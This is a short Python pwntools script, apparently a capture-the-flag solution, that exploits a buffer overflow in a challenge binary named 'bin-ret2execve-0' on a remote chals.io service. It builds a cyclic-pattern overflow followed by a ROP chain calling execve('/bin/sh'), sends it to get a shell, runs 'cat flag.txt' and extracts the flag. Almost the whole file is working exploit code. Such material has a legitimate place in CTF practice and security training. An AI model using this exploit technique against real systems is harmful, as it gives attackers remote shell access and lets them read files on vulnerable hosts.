from pwn import *
import detection
import re

context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)
context.clear(arch='amd64')
# ------------------------------------- #
# exploit(binary: str)                  #
#                                       #
# INPUT:  filename of vulnerable binary #
# OUTPUT: remote flag                   #
# ------------------------------------- #
def exploit(binary: str):
    flag_regex = r'flag\{[^}]+\}'

    url = f'ace-service-{binary}.chals.io'
    p = remote(url, 443, ssl=True, sni=url)
    e = ELF(binary)
    rop = ROP(binary)
    p.recvuntil(b'>>>')

    payload = b''

    payload += cyclic(detection.find_rip_offset(binary))
    rop(rdi = next(e.search(b'/bin/sh\x00')), rsi=0, rdx=0)
    rop.call('execve')
    payload += rop.chain()

    
    p.sendline(payload)
    #Since I'm going for a shell rather than a win function, there's no try and see here.
    p.sendline(b'cat flag.txt')
    output = p.recvall(timeout=0.2)
    
    flag = re.findall(flag_regex, output.decode())
    if flag: # Success
        #print(flag)
        return flag[0]
    else: # Failure
        return

exploit('bin-ret2execve-0')